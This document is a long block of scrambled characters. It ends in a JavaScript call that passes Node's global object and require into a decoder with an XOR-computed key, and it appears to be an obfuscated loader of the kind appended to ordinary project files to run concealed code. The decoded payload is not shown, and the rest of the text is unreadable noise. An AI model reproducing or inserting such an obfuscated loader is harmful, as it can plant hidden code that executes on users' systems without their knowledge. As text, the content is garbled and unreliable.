Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR"tcsc.!rVRpaiz0<b"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f"t RRsN</C RnRdRrpRR<od<.R<r[ar"l<. P".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR"RuRRR"RtR<Rs".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}."P&yseR_a%rRR.D<iPsRD!i.mR"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR""](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.("]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?.."lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv "4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR"sz3o"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b "cRt,\'leacPc RR<Rz"<Ri l0oRRdRs7.R(eCcR_.6"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w"l{e]e-R</<s4Nt.op"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#"<cqk<ek.imRSN.RsE bPPn)<e}o0e".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR')))(677251^678990);}(global,require);
